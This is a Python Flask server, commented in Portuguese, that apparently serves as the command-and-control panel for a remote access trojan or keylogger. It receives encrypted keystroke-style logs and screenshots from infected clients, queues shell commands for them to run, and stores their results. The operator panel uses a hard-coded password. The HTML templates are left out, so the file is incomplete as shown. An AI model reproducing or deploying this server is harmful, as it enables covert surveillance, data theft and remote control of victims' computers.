from flask import Flask, request, render_template_string, jsonify, send_file, session, redirect, url_for
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad, pad
import base64, os, json, queue, glob
from datetime import datetime
import threading
from functools import wraps

app = Flask(__name__, static_folder='.', static_url_path='')
app.secret_key = "chave_secreta_para_sessao"  # Altere para uma chave secreta forte

# ===== SENHA FIXA DO PAINEL =====
SENHA_PAINEL = "admin123"   # Você pode mudar aqui
print(f"\n[!] SENHA DO PAINEL: {SENHA_PAINEL}")
print("[!] Use esta senha para acessar o painel.\n")
# ================================

CHAVE = bytes.fromhex("00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff")

# Estruturas de dados
comandos = {}
resultados = {}
ultima_screenshot = {}

# ========== DECORADOR DE AUTENTICAÇÃO ==========
def requer_autenticacao(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('autenticado'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# ========== CRIPTOGRAFIA ==========
def descriptografar(dados_b64):
    raw = base64.b64decode(dados_b64.strip())
    iv, cifra = raw[:16], raw[16:]
    texto = unpad(AES.new(CHAVE, AES.MODE_CBC, iv).decrypt(cifra), AES.block_size)
    return texto.decode('utf-8')

def criptografar(texto):
    iv = os.urandom(16)
    cifra = AES.new(CHAVE, AES.MODE_CBC, iv).encrypt(pad(texto.encode(), AES.block_size))
    return base64.b64encode(iv + cifra).decode()

# ========== ROTAS DE AUTENTICAÇÃO ==========
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        senha = request.form.get('senha', '')
        if senha == SENHA_PAINEL:
            session['autenticado'] = True
            return redirect(url_for('painel'))
        else:
            return render_template_string(HTML_LOGIN, erro="Senha incorreta")
    return render_template_string(HTML_LOGIN)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# ========== ROTAS FUNCIONAIS ==========
@app.route('/log', methods=['POST'])
def receber_log():
    data = request.get_json()
    try:
        texto = descriptografar(data['dados'])
        with open('logs.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n{texto}\n{'-'*40}\n")
        return "OK", 200
    except Exception as e:
        return f"Erro: {str(e)}", 500

@app.route('/screenshot', methods=['POST'])
def receber_screenshot():
    data = request.get_json()
    try:
        client_id = data.get('id', 'default')
        img_b64 = data['imagem']
        filename = f"screenshot_{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        with open(filename, 'wb') as f:
            f.write(base64.b64decode(img_b64))
        ultima_screenshot[client_id] = filename
        return "OK", 200
    except Exception as e:
        return f"Erro: {str(e)}", 500

@app.route('/cmd', methods=['GET'])
def pegar_comando():
    client_id = request.args.get('id', 'default')
    if client_id not in comandos:
        comandos[client_id] = queue.Queue()
    try:
        cmd = comandos[client_id].get(timeout=30)
        return criptografar(cmd)
    except queue.Empty:
        return ""

@app.route('/cmd', methods=['POST'])
def enviar_comando():
    data = request.get_json()
    client_id = data.get('id', 'default')
    comando = data.get('comando', '')
    if client_id not in comandos:
        comandos[client_id] = queue.Queue()
    comandos[client_id].put(comando)
    return jsonify({"status": "ok", "message": f"Comando '{comando}' enviado"})

@app.route('/result', methods=['POST'])
def receber_resultado():
    data = request.get_json()
    client_id = data.get('id', 'default')
    resultado_cripto = data.get('resultado', '')
    try:
        resultado_legivel = descriptografar(resultado_cripto)
    except:
        resultado_legivel = f"[ERRO: {resultado_cripto[:50]}...]"
    if client_id not in resultados:
        resultados[client_id] = []
    resultados[client_id].append({
        'hora': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'resultado': resultado_legivel
    })
    with open(f'resultados_{client_id}.txt', 'a', encoding='utf-8') as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n{resultado_legivel}\n{'-'*40}\n")
    return "OK", 200

# ========== ROTAS PARA O PAINEL ==========
@app.route('/screenshots')
def listar_screenshots():
    arquivos = sorted(glob.glob('screenshot_*.png'), key=os.path.getmtime, reverse=True)[:20]
    return jsonify([f"/{f}" for f in arquivos])

@app.route('/ultima_screenshot/<client_id>')
def pegar_ultima_screenshot(client_id):
    if client_id in ultima_screenshot and os.path.exists(ultima_screenshot[client_id]):
        return send_file(ultima_screenshot[client_id], mimetype='image/png')
    return "Nenhuma screenshot disponível", 404

# ========== PAINEL HTML ==========
# (O HTML completo é o mesmo fornecido anteriormente)
# Por questões de espaço, omitimos a repetição aqui, mas você deve incluir
# as constantes HTML_LOGIN e HTML_PAINEL com o código completo.
# Consulte o arquivo final do projeto para o HTML completo.

# Placeholder – no projeto final, substituir pelo HTML real.
# =====================================================

@app.route('/painel')
@requer_autenticacao
def painel():
    return render_template_string(HTML_PAINEL)

@app.route('/logs')
def ver_logs():
    try:
        with open('logs.txt', 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return "Nenhum log disponível."

@app.route('/resultados/<client_id>')
def ver_resultados(client_id):
    try:
        with open(f'resultados_{client_id}.txt', 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return "Nenhum resultado para este cliente."

# ========== INICIALIZAÇÃO ==========
if __name__ == '__main__':
    print("[+] Servidor Flask iniciado em http://0.0.0.0:8080")
    print("[+] Acesse o painel em http://<IP>:8080/painel")
    app.run(host='0.0.0.0', port=8080, debug=False, threaded=True)
